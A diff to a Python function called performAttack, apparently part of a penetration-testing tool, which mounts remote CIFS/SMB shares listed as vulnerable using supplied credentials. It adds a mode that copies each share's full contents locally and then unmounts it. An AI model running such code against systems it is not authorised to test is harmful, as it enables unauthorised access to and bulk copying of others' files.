@@ -75,16 +75,30 @@ def performAttack(location, serverIP, username, password=None, copy=False):
 			print ("remote filesystem " + serverIP + "/" + mountpoint + " is mounted at " + location)
 	else:
 		os.mkdir(location)
-		lastFolder = str.split(location, "/")
-		lastFolder = lastFolder[len(lastFolder)-1]
-		location = location + "/" + lastFolder
-		for i in range(len(mountpoints)):
-			mountpoint = mountpoints[i]
-			tempLocation = location + "-" + str(i)
-			os.mkdir(tempLocation)
-			mountArgs = ["mount", "-t", "cifs", "-o", "username=" + username + ",password=" + password, "//" + serverIP + "/" + mountpoint, tempLocation]
-			call(mountArgs)
-			print ("remote filesystem " + serverIP + "/" + mountpoint + " is mounted at " + tempLocation)
+		if copy:
+			#Each subdirectory directly under the main mount location is a separate mount point on the remote target
+			for i in range(len(mountpoints)):
+				mountpoint = mountpoints[i]
+				tempLocation = location + "/" + mountpoint
+				os.mkdir(tempLocation)
+				mountArgs = ["mount", "-t", "cifs", "-o", "username=" + username + ",password=" + password, "//" + serverIP + "/" + mountpoint, "./assets/tempMount"]
+				call(mountArgs)
+				copyMountFiles = ["cp", "-a", "./assets/tempMount/.", tempLocation]
+				call(copyMountFiles)
+				unMount = ["umount", "./assets/tempMount/"]
+				call(unMount)
+				
+		else:
+			lastFolder = str.split(location, "/")
+			lastFolder = lastFolder[len(lastFolder)-1]
+			location = location + "/" + lastFolder
+			for i in range(len(mountpoints)):
+				mountpoint = mountpoints[i]
+				tempLocation = location + "-" + str(i)
+				os.mkdir(tempLocation)
+				mountArgs = ["mount", "-t", "cifs", "-o", "username=" + username + ",password=" + password, "//" + serverIP + "/" + mountpoint, tempLocation]
+				call(mountArgs)
+				print ("remote filesystem " + serverIP + "/" + mountpoint + " is mounted at " + tempLocation)
 	
 	os.remove("vulnerableMountPoints.txt")
 		
